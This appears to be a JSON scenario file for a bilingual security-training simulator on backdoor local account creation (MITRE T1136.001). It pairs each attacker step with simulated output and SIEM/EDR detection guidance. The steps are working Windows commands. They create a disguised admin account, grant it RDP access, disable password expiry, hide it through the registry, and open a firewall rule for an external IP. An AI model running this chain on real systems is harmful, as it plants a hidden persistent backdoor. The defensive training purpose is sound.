@@ -1,0 +1,245 @@
+{
+  "id": "T1136.001",
+  "title": "백도어 로컬 계정 생성 시뮬레이션",
+  "titleEn": "Backdoor Local Account Creation Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "정찰", "labelEn": "Recon", "icon": "🔍" },
+    { "label": "공격", "labelEn": "Attack", "icon": "⚔️" },
+    { "label": "침투", "labelEn": "Breach", "icon": "💀" },
+    { "label": "완료", "labelEn": "Complete", "icon": "🏁" }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker (External)", "icon": "💻" },
+    { "id": "victim", "label": "DESKTOP-SEC01", "icon": "🖥️" },
+    { "id": "dc01", "label": "DC01 (AD)", "icon": "🏰" },
+    { "id": "siem", "label": "SIEM / EDR", "icon": "🛡️" }
+  ],
+  "topoEdges": [
+    { "from": "victim", "to": "dc01", "label": "User Enum", "activeStep": [0] },
+    { "from": "attacker", "to": "victim", "label": "RDP Backdoor", "activeStep": [5, 6] },
+    { "from": "victim", "to": "siem", "label": "Alert", "activeStep": [1, 2, 3, 4, 5, 6] },
+    { "from": "dc01", "to": "siem", "label": "AD Audit", "activeStep": [0, 3] }
+  ],
+  "desktopIcons": [
+    { "name": "net.exe", "icon": "👤", "alertOnStep": 1 },
+    { "name": "reg.exe", "icon": "📝", "alertOnStep": 4 },
+    { "name": "netsh.exe", "icon": "🔥", "alertOnStep": 5 },
+    { "name": "mstsc.exe", "icon": "🖥️", "alertOnStep": 6 }
+  ],
+  "steps": [
+    {
+      "cmd": "net user /domain | findstr /i \"admin service backup\"",
+      "out": "Administrator            admin_backup             admin_svc\nBackupService            ServiceDesk              svc_monitor\nsvc_sql                  svc_web                  \n\nThe command completed successfully.\n\n[*] Existing admin/service accounts enumerated\n[*] Naming convention identified: svc_[function], admin_[function]\n[*] Recommended cover name: svc_health (matches pattern)\n[*] Local admin group members: Administrator, admin_backup",
+      "def": "[SIEM] Domain user enumeration via net user /domain from non-admin workstation",
+      "defAction": "Source: Command-line audit logging (Event ID 4688)\nTarget: net.exe execution\nAction: User enumeration logged, source user flagged for monitoring",
+      "desc": "기존 서비스/관리자 계정의 명명 규칙을 파악하여 의심받지 않을 계정 이름을 결정합니다.",
+      "descEn": "The attacker enumerates existing service and admin accounts to determine a naming convention for the backdoor account.",
+      "stepTitle": "계정 명명 규칙 정찰",
+      "stepTitleEn": "Account Naming Recon",
+      "feynman": "회사 직원 명단을 보면서 '어떤 이름 패턴이 의심받지 않을까' 조사하는 것과 같아요. svc_sql, svc_web이 있으니 svc_health라고 하면 아무도 의심하지 않겠죠.",
+      "feynmanEn": "It's like studying the employee roster to find naming patterns that won't raise suspicion. Since svc_sql and svc_web exist, svc_health would blend right in.",
+      "expert": "net user /domain으로 도메인 사용자를 열거하는 MITRE T1087.002 (Account Discovery: Domain Account)입니다. 공격자는 기존 명명 규칙(svc_, admin_)을 분석하여 T1036 (Masquerading) 기법으로 백도어 계정을 위장합니다. findstr로 필터링하는 것은 표적화된 정찰을 의미합니다.",
+      "expertEn": "Domain user enumeration via net user /domain maps to MITRE T1087.002. Attackers analyze existing naming conventions (svc_, admin_) for T1036 (Masquerading) to disguise backdoor accounts. Filtering with findstr indicates targeted reconnaissance.",
+      "defTooltip": "Windows Event ID 4688 (Process Creation)에서 'net user /domain' 실행을 모니터링하세요. 비관리자 워크스테이션에서의 도메인 사용자 열거는 정찰 활동의 지표입니다.",
+      "defTooltipEn": "Monitor 'net user /domain' execution via Event ID 4688. Domain user enumeration from non-admin workstations indicates reconnaissance activity.",
+      "hackerLog": {
+        "title": "서비스 계정 명명 규칙 파악",
+        "lines": [
+          { "text": "net user /domain | findstr /i \"admin service backup\"", "desc": "도메인에서 관리자/서비스 계정만 필터링 조회" },
+          { "text": "svc_sql  svc_web  svc_monitor", "desc": "svc_ 접두어 패턴 확인 - 위장에 활용" },
+          { "text": "Recommended cover name: svc_health", "desc": "기존 패턴에 맞는 백도어 계정명 결정" }
+        ]
+      },
+      "terms": [
+        { "term": "Naming Convention", "desc": "조직에서 계정 이름을 생성할 때 따르는 패턴이나 규칙입니다." },
+        { "term": "Masquerading (T1036)", "desc": "정상적인 항목처럼 보이도록 위장하는 공격 기법입니다." },
+        { "term": "Service Account", "desc": "서비스나 애플리케이션 실행을 위한 전용 계정입니다." }
+      ]
+    },
+    {
+      "cmd": "net user svc_health \"S3cur1ty@2024!\" /add /comment:\"System Health Monitoring Service\" /fullname:\"Health Monitor Service\"",
+      "out": "The command completed successfully.\n\n[*] Local account created:\n    Username: svc_health\n    Password: S3cur1ty@2024!\n    Full Name: Health Monitor Service\n    Comment: System Health Monitoring Service\n    Created: 2024-03-15 14:23:41\n\n[*] Account properties:\n    - Appears as legitimate service account\n    - Strong password (meets complexity requirements)\n    - Comment field adds legitimacy\n    - Local account (not domain-joined)",
+      "def": "[SIEM] New local user account created: svc_health - Event ID 4720",
+      "defAction": "Source: Windows Security Event Log (ID 4720 - User Account Created)\nTarget: svc_health account\nAction: Alert generated, account creation outside of provisioning workflow flagged",
+      "desc": "합법적인 서비스 계정처럼 보이는 백도어 로컬 계정을 생성합니다.",
+      "descEn": "The attacker creates a backdoor local account disguised as a legitimate service account.",
+      "stepTitle": "백도어 계정 생성",
+      "stepTitleEn": "Backdoor Account Create",
+      "feynman": "가짜 사원증을 만드는 것과 같아요. '시스템 건강 모니터 서비스'라는 그럴듯한 이름과 설명을 붙여서, 누가 봐도 정상적인 서비스 계정처럼 보이게 합니다.",
+      "feynmanEn": "It's like creating a fake employee badge. With the plausible name 'Health Monitor Service' and matching description, it looks like a legitimate service account to anyone who checks.",
+      "expert": "net user /add로 로컬 계정을 생성하는 MITRE T1136.001 (Create Account: Local Account)입니다. /comment와 /fullname 파라미터를 설정하여 계정의 합법성을 위장합니다. Event ID 4720 (User Account Created)이 즉시 생성되며, 프로비저닝 워크플로우 외부에서의 계정 생성은 즉각 조사 대상입니다.",
+      "expertEn": "Local account creation via net user /add maps to MITRE T1136.001. /comment and /fullname parameters add legitimacy disguise. Event ID 4720 (User Account Created) fires immediately; account creation outside provisioning workflows requires immediate investigation.",
+      "defTooltip": "Windows Event ID 4720 (User Account Created)을 실시간 모니터링하세요. 정상적인 IT 프로비저닝 프로세스 외에서 생성되는 계정은 백도어 가능성이 높습니다.",
+      "defTooltipEn": "Monitor Event ID 4720 (User Account Created) in real-time. Accounts created outside normal IT provisioning processes have high backdoor probability.",
+      "hackerLog": {
+        "title": "위장된 로컬 계정 생성",
+        "lines": [
+          { "text": "net user svc_health \"S3cur1ty@2024!\" /add", "desc": "서비스 계정으로 위장한 백도어 계정 생성" },
+          { "text": "/comment:\"System Health Monitoring Service\"", "desc": "합법적으로 보이는 설명 추가" },
+          { "text": "/fullname:\"Health Monitor Service\"", "desc": "정상 서비스처럼 보이는 전체 이름 설정" }
+        ]
+      },
+      "terms": [
+        { "term": "Event ID 4720", "desc": "Windows 보안 로그에서 새 사용자 계정 생성을 기록하는 이벤트입니다." },
+        { "term": "Backdoor Account", "desc": "공격자가 지속적 접근을 위해 생성하는 비인가 계정입니다." },
+        { "term": "Provisioning Workflow", "desc": "IT 부서의 공식적인 계정 생성 절차와 승인 프로세스입니다." }
+      ]
+    },
+    {
+      "cmd": "net localgroup Administrators svc_health /add && net localgroup \"Remote Desktop Users\" svc_health /add",
+      "out": "The command completed successfully.\nThe command completed successfully.\n\n[*] Group memberships added:\n    svc_health → Administrators (local admin)\n    svc_health → Remote Desktop Users (RDP access)\n\n[*] Current Administrators group:\n    Administrator\n    admin_backup\n    {companyName}\\Domain Admins\n    svc_health              ← NEW\n\n[*] Capabilities:\n    - Full local administrator access\n    - Remote Desktop login enabled\n    - Can access all local resources\n    - Can modify security settings",
+      "def": "[SIEM] User svc_health added to Administrators and Remote Desktop Users groups - Event ID 4732",
+      "defAction": "Source: Security Event Log (ID 4732 - Member Added to Security Group)\nTarget: svc_health → Administrators, Remote Desktop Users\nAction: CRITICAL alert to SOC, group modification flagged for immediate review",
+      "desc": "생성한 계정을 관리자 그룹과 원격 데스크톱 사용자 그룹에 추가합니다.",
+      "descEn": "The attacker adds the backdoor account to the Administrators and Remote Desktop Users groups.",
+      "stepTitle": "관리자 권한 부여",
+      "stepTitleEn": "Admin Privileges Grant",
+      "feynman": "가짜 사원증에 'VIP 출입 권한'과 '원격 접속 권한'을 추가하는 것과 같아요. 이제 svc_health 계정은 모든 곳에 갈 수 있고, 원격으로도 접속할 수 있습니다.",
+      "feynmanEn": "It's like adding 'VIP access' and 'remote login' to the fake employee badge. The svc_health account can now go anywhere and connect remotely.",
+      "expert": "net localgroup /add로 Administrators와 Remote Desktop Users 그룹에 동시 추가합니다. MITRE T1098 (Account Manipulation)에 해당합니다. Event ID 4732 (Member Added to Security-Enabled Local Group)가 2회 발생합니다. 관리자 그룹 변경은 SOC에서 최우선 감시 대상이어야 합니다.",
+      "expertEn": "Simultaneously adds to Administrators and Remote Desktop Users groups via net localgroup /add. Maps to MITRE T1098 (Account Manipulation). Event ID 4732 fires twice. Administrator group changes should be top-priority SOC monitoring.",
+      "defTooltip": "Windows Event ID 4732 (Member Added to Security-Enabled Local Group)에서 Administrators 그룹 변경을 최우선 감시하세요. 새로 생성된 계정이 즉시 관리자 그룹에 추가되면 공격 가능성이 매우 높습니다.",
+      "defTooltipEn": "Prioritize monitoring Event ID 4732 for Administrators group changes. A newly created account immediately added to Administrators has very high attack probability.",
+      "hackerLog": {
+        "title": "관리자 + RDP 권한 부여",
+        "lines": [
+          { "text": "net localgroup Administrators svc_health /add", "desc": "백도어 계정에 로컬 관리자 권한 부여" },
+          { "text": "net localgroup \"Remote Desktop Users\" svc_health /add", "desc": "원격 데스크톱 접속 권한 추가" },
+          { "text": "svc_health ← NEW", "desc": "Administrators 그룹에 새 구성원 추가 확인" }
+        ]
+      },
+      "terms": [
+        { "term": "Event ID 4732", "desc": "보안 그룹에 구성원이 추가될 때 기록되는 Windows 이벤트입니다." },
+        { "term": "Local Administrators", "desc": "시스템에 대한 전체 관리 권한을 가진 Windows 로컬 보안 그룹입니다." },
+        { "term": "Privilege Escalation", "desc": "공격자가 더 높은 수준의 시스템 권한을 획득하는 행위입니다." }
+      ]
+    },
+    {
+      "cmd": "net user svc_health /passwordchg:no && wmic useraccount where Name='svc_health' set PasswordExpires=FALSE",
+      "out": "The command completed successfully.\n\nUpdating property(s) of '\\\\DESKTOP-SEC01\\ROOT\\CIMV2:Win32_UserAccount.Domain=\"DESKTOP-SEC01\",Name=\"svc_health\"'\nProperty(s) update successful.\n\n[*] Account hardening:\n    Password change by user: DISABLED\n    Password expires: NEVER\n    Account expires: NEVER\n\n[*] This ensures:\n    - Victim cannot change the backdoor password\n    - Account remains accessible indefinitely\n    - No password rotation will lock out attacker\n    - Standard password policies bypassed",
+      "def": "[SIEM] Account svc_health password policies modified - non-expiring password set",
+      "defAction": "Source: Active Directory audit (Event ID 4738 - User Account Changed)\nTarget: svc_health account policies\nAction: Password policy violation flagged, compliance audit triggered",
+      "desc": "비밀번호 만료를 비활성화하고 사용자의 비밀번호 변경을 차단하여 지속적 접근을 보장합니다.",
+      "descEn": "The attacker disables password expiration and prevents password changes to ensure persistent access.",
+      "stepTitle": "비밀번호 정책 우회",
+      "stepTitleEn": "Password Policy Bypass",
+      "feynman": "가짜 사원증의 유효기간을 '무한'으로 설정하고, 다른 사람이 비밀번호를 바꿀 수 없게 잠그는 것과 같아요. 이 계정은 영원히 공격자의 뒷문으로 남습니다.",
+      "feynmanEn": "It's like setting the fake badge's expiration to 'forever' and locking the password so no one else can change it. This account remains the attacker's backdoor indefinitely.",
+      "expert": "비밀번호 만료 비활성화(PasswordExpires=FALSE)와 사용자 비밀번호 변경 차단(/passwordchg:no)은 MITRE T1098 (Account Manipulation)의 지속성 확보 기법입니다. Event ID 4738 (User Account Changed)이 발생합니다. 조직의 비밀번호 정책(90일 주기 변경 등)을 위반하므로 컴플라이언스 모니터링에서 탐지해야 합니다.",
+      "expertEn": "Disabling password expiration (PasswordExpires=FALSE) and preventing password changes (/passwordchg:no) is a persistence technique under MITRE T1098. Event ID 4738 (User Account Changed) fires. Violates organizational password policies (90-day rotation), detectable by compliance monitoring.",
+      "defTooltip": "Windows Event ID 4738 (User Account Changed)에서 비밀번호 정책 변경을 감시하세요. 'Don't Expire Password' 플래그가 설정된 계정은 정책 위반 및 백도어 의심 대상입니다.",
+      "defTooltipEn": "Monitor password policy changes via Event ID 4738. Accounts with 'Don't Expire Password' flag set are policy violations and suspected backdoors.",
+      "hackerLog": {
+        "title": "비밀번호 정책 무력화",
+        "lines": [
+          { "text": "net user svc_health /passwordchg:no", "desc": "사용자 비밀번호 변경 차단" },
+          { "text": "wmic useraccount set PasswordExpires=FALSE", "desc": "비밀번호 만료 기간 무한으로 설정" },
+          { "text": "Standard password policies bypassed", "desc": "조직의 비밀번호 정책 완전 우회" }
+        ]
+      },
+      "terms": [
+        { "term": "Event ID 4738", "desc": "사용자 계정 속성이 변경될 때 기록되는 Windows 보안 이벤트입니다." },
+        { "term": "Password Expiration", "desc": "일정 기간 후 비밀번호 변경을 강제하는 보안 정책입니다." },
+        { "term": "Persistence", "desc": "공격자가 시스템에 대한 지속적 접근을 유지하기 위한 기법입니다." }
+      ]
+    },
+    {
+      "cmd": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v svc_health /t REG_DWORD /d 0 /f",
+      "out": "The operation completed successfully.\n\n[*] Account hidden from login screen:\n    Registry: HKLM\\...\\SpecialAccounts\\UserList\n    Value: svc_health = 0 (hidden)\n\n[*] Account visibility:\n    Windows login screen: HIDDEN ✓\n    Control Panel > User Accounts: HIDDEN ✓\n    net user command: VISIBLE (still shows)\n    lusrmgr.msc: VISIBLE (still shows)\n\n[*] The account exists but is not visible to casual users\n[*] Only system administrators checking net user will notice",
+      "def": "[EDR] SpecialAccounts\\UserList registry modification - account hiding technique",
+      "defAction": "Source: Registry monitoring (Sysmon Event ID 13)\nTarget: SpecialAccounts\\UserList\\svc_health\nAction: Hidden account discovered, registry value removed to restore visibility",
+      "desc": "레지스트리를 수정하여 생성한 계정을 Windows 로그인 화면과 사용자 목록에서 숨깁니다.",
+      "descEn": "The attacker modifies the registry to hide the backdoor account from the Windows login screen and user lists.",
+      "stepTitle": "계정 숨김 처리",
+      "stepTitleEn": "Account Hiding",
+      "feynman": "건물 입주자 명단에서 이름을 지우는 것과 같아요. 사무실(계정)은 존재하지만 로비 안내판에는 보이지 않습니다. 관리인(시스템 관리자)이 직접 확인해야만 알 수 있어요.",
+      "feynmanEn": "It's like erasing a name from the building's tenant list. The office (account) exists, but it doesn't appear on the lobby directory. Only the building manager (sysadmin) would notice if they check directly.",
+      "expert": "SpecialAccounts\\UserList 레지스트리는 Windows 로그인 화면(Winlogon)에서 특정 계정을 숨기는 기능입니다. MITRE T1564.002 (Hide Artifacts: Hidden Users)에 해당합니다. 값 0으로 설정하면 로그인 UI와 제어판에서 숨겨지지만, net user와 lusrmgr.msc에서는 여전히 표시됩니다. Sysmon Event ID 13 (Registry Value Set)으로 탐지 가능합니다.",
+      "expertEn": "SpecialAccounts\\UserList registry hides accounts from Windows login screen (Winlogon). Maps to MITRE T1564.002 (Hidden Users). Setting value to 0 hides from login UI and Control Panel, but net user and lusrmgr.msc still show it. Detectable via Sysmon Event ID 13.",
+      "defTooltip": "Sysmon Event ID 13 (Registry Value Set)에서 SpecialAccounts\\UserList 경로의 변경을 감시하세요. 이 레지스트리는 계정 은닉의 확실한 지표이며, 즉시 해당 값을 삭제하고 계정을 조사해야 합니다.",
+      "defTooltipEn": "Monitor SpecialAccounts\\UserList path changes via Sysmon Event ID 13. This registry key is a definitive indicator of account hiding; immediately delete the value and investigate the account.",
+      "hackerLog": {
+        "title": "로그인 화면에서 계정 숨김",
+        "lines": [
+          { "text": "reg add ...\\SpecialAccounts\\UserList /v svc_health /d 0", "desc": "레지스트리에서 로그인 UI 계정 숨김 설정" },
+          { "text": "Windows login screen: HIDDEN", "desc": "로그인 화면에서 계정이 보이지 않음" },
+          { "text": "net user command: VISIBLE (still shows)", "desc": "명령줄에서는 여전히 확인 가능 - 완벽한 은닉은 아님" }
+        ]
+      },
+      "terms": [
+        { "term": "SpecialAccounts\\UserList", "desc": "Windows 로그인 화면에서 특정 사용자를 숨기는 레지스트리 키입니다." },
+        { "term": "T1564.002 (Hidden Users)", "desc": "시스템에서 사용자 계정을 숨기는 MITRE ATT&CK 기법입니다." },
+        { "term": "Winlogon", "desc": "Windows 로그인/로그오프 프로세스를 관리하는 시스템 구성요소입니다." }
+      ]
+    },
+    {
+      "cmd": "netsh advfirewall firewall add rule name=\"System Health Monitor\" dir=in action=allow protocol=tcp localport=3389 remoteip=185.220.101.34 enable=yes",
+      "out": "Ok.\n\n[*] Firewall rule created:\n    Name: System Health Monitor\n    Direction: Inbound\n    Action: Allow\n    Protocol: TCP\n    Local Port: 3389 (RDP)\n    Remote IP: 185.220.101.34 (attacker)\n    Status: Enabled\n\n[*] RDP access now available:\n    Target: DESKTOP-SEC01:3389\n    Allowed from: 185.220.101.34 only\n    Credentials: svc_health / S3cur1ty@2024!\n\n[*] Firewall rule name blends with health monitoring services",
+      "def": "[Firewall Monitor] New inbound RDP rule created allowing specific external IP",
+      "defAction": "Source: Windows Firewall audit log\nTarget: Firewall rule 'System Health Monitor'\nAction: Rule disabled, external RDP access blocked, network team notified",
+      "desc": "방화벽에 공격자 IP에서만 RDP 접속을 허용하는 규칙을 추가합니다.",
+      "descEn": "The attacker creates a firewall rule allowing RDP access only from the attacker's IP address.",
+      "stepTitle": "방화벽 규칙 추가",
+      "stepTitleEn": "Firewall Rule Add",
+      "feynman": "건물 후문에 '특정 사람만 출입 가능' 카드 리더기를 설치하는 것과 같아요. 공격자의 IP 주소에서만 RDP 접속이 허용되며, 규칙 이름도 정상 서비스처럼 위장합니다.",
+      "feynmanEn": "It's like installing a card reader on the back door that only allows a specific person. RDP access is allowed only from the attacker's IP, and the rule name is disguised as a normal service.",
+      "expert": "netsh advfirewall로 인바운드 RDP 규칙을 생성하며, remoteip로 공격자 IP만 허용합니다. MITRE T1562.004 (Disable or Modify System Firewall)에 해당합니다. 'System Health Monitor'라는 이름으로 T1036 (Masquerading)을 적용합니다. Windows Firewall Event ID 2004 (Rule Added)에 기록됩니다.",
+      "expertEn": "Creates an inbound RDP rule via netsh advfirewall, allowing only the attacker's IP via remoteip. Maps to MITRE T1562.004 (Modify System Firewall) with T1036 (Masquerading) applied to the rule name. Logged in Firewall Event ID 2004 (Rule Added).",
+      "defTooltip": "Windows Firewall Event ID 2004 (Rule Added)에서 외부 IP를 허용하는 인바운드 3389 규칙을 감시하세요. 특히 규칙 이름이 정상 서비스처럼 위장된 경우 의심해야 합니다.",
+      "defTooltipEn": "Monitor Firewall Event ID 2004 for inbound 3389 rules allowing external IPs. Be especially suspicious when rule names are disguised as normal services.",
+      "hackerLog": {
+        "title": "RDP 방화벽 백도어 규칙",
+        "lines": [
+          { "text": "netsh advfirewall firewall add rule name=\"System Health Monitor\"", "desc": "정상 서비스 이름으로 위장한 방화벽 규칙 생성" },
+          { "text": "localport=3389 remoteip=185.220.101.34", "desc": "공격자 IP에서만 RDP 접속 허용" },
+          { "text": "Credentials: svc_health / S3cur1ty@2024!", "desc": "숨겨진 백도어 계정으로 원격 접속 가능" }
+        ]
+      },
+      "terms": [
+        { "term": "netsh advfirewall", "desc": "Windows 방화벽을 명령줄에서 관리하는 도구입니다." },
+        { "term": "T1562.004", "desc": "시스템 방화벽을 수정하거나 비활성화하는 MITRE ATT&CK 기법입니다." },
+        { "term": "Inbound Rule", "desc": "외부에서 내부로 들어오는 트래픽을 제어하는 방화벽 규칙입니다." }
+      ]
+    },
+    {
+      "cmd": "mstsc /v:DESKTOP-SEC01.{companyName}.local /u:svc_health",
+      "out": "[*] Testing RDP backdoor access...\n[*] Connecting to DESKTOP-SEC01.{companyName}.local:3389\n[*] Username: svc_health\n[*] Authentication: NLA (Network Level Authentication)\n\n[+] RDP Connection successful!\n[+] Session type: Console\n[+] Logged in as: DESKTOP-SEC01\\svc_health\n[+] Privileges: Administrator\n\n[*] Backdoor verification complete:\n    ✓ Account created and hidden\n    ✓ Admin privileges confirmed\n    ✓ Password never expires\n    ✓ RDP access working\n    ✓ Firewall rule active\n    ✓ Account hidden from login screen\n\n[+] Persistent backdoor fully operational",
+      "def": "[SIEM] RDP login from external IP using newly created hidden service account - CRITICAL",
+      "defAction": "Source: Windows Event Log (ID 4624 Type 10 - RemoteInteractive)\nTarget: svc_health RDP session from 185.220.101.34\nAction: Session terminated, account disabled, firewall rule removed, full incident response initiated",
+      "desc": "생성한 백도어 계정으로 RDP 접속을 테스트하여 지속적 원격 접근이 가능한지 확인합니다.",
+      "descEn": "The attacker tests RDP access with the backdoor account to verify persistent remote access capability.",
+      "stepTitle": "백도어 접속 검증",
+      "stepTitleEn": "Backdoor Access Test",
+      "feynman": "설치한 뒷문이 제대로 작동하는지 직접 열어보는 것과 같아요. 숨겨진 계정으로 로그인하고, 관리자 권한이 있는지, 비밀번호가 만료되지 않는지 모든 것을 최종 확인합니다.",
+      "feynmanEn": "It's like testing the installed back door to make sure it works properly. Log in with the hidden account and verify everything: admin privileges, non-expiring password, and working RDP access.",
+      "expert": "RDP 백도어 검증은 공격 체인의 최종 단계입니다. Event ID 4624 (Type 10 - RemoteInteractive)에서 외부 IP(185.220.101.34)로부터의 svc_health 로그인이 기록됩니다. MITRE T1021.001 (Remote Desktop Protocol)이 T1136.001과 결합됩니다. 이 시점에서 공격자는 계정 생성, 권한 상승, 은닉, 방화벽 우회, 원격 접속의 전체 킬체인을 완성합니다.",
+      "expertEn": "RDP backdoor verification is the final step of the attack chain. Event ID 4624 (Type 10) logs svc_health login from external IP (185.220.101.34). MITRE T1021.001 combined with T1136.001. At this point, the attacker completes the full kill chain: account creation, privilege escalation, hiding, firewall bypass, and remote access.",
+      "defTooltip": "Event ID 4624 (Type 10)에서 외부 IP의 RDP 로그인을 감시하세요. 최근 생성된 계정(Event ID 4720)으로의 외부 RDP 접속은 백도어 활성화의 확실한 증거입니다.",
+      "defTooltipEn": "Monitor Event ID 4624 (Type 10) for external IP RDP logins. External RDP access to recently created accounts (Event ID 4720) is definitive evidence of backdoor activation.",
+      "hackerLog": {
+        "title": "RDP 백도어 최종 검증",
+        "lines": [
+          { "text": "mstsc /v:DESKTOP-SEC01 /u:svc_health", "desc": "숨겨진 백도어 계정으로 RDP 접속 테스트" },
+          { "text": "RDP Connection successful!", "desc": "원격 데스크톱 접속 성공 확인" },
+          { "text": "Persistent backdoor fully operational", "desc": "계정 은닉, 관리자 권한, 비밀번호 무만료 모두 정상" }
+        ]
+      },
+      "terms": [
+        { "term": "Kill Chain", "desc": "사이버 공격의 전체 단계(정찰→무기화→전달→침투→지속성)를 나타내는 모델입니다." },
+        { "term": "Logon Type 10", "desc": "Windows 이벤트 로그에서 RDP 원격 로그인을 나타내는 유형입니다." },
+        { "term": "mstsc", "desc": "Microsoft Terminal Services Client의 약자로, Windows 기본 RDP 클라이언트입니다." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "cmd.exe (attacker)", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "net.exe user /domain (PID: 6001)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "net.exe user svc_health /add (PID: 6101)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "net.exe localgroup /add (PID: 6201)", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "wmic.exe useraccount (PID: 6301)", "depth": 1, "alert": true, "minStep": 3 },
+    { "name": "reg.exe add SpecialAccounts (PID: 6401)", "depth": 1, "alert": true, "minStep": 4 },
+    { "name": "netsh.exe advfirewall (PID: 6501)", "depth": 1, "alert": true, "minStep": 5 },
+    { "name": "mstsc.exe RDP (PID: 6601)", "depth": 1, "alert": true, "minStep": 6 }
+  ]
+}
